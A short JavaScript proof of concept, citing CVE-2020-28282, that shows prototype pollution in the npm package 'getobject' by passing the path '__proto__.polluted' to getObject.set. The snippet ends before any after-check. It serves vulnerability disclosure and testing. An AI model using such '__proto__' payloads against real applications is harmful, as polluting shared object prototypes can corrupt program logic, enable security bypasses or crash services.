//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28282
  const getObject = require("getobject");
  var obj = {};
  console.log("Before  : " + obj.polluted);
  getObject.set(obj, "__proto__.polluted", "yes");
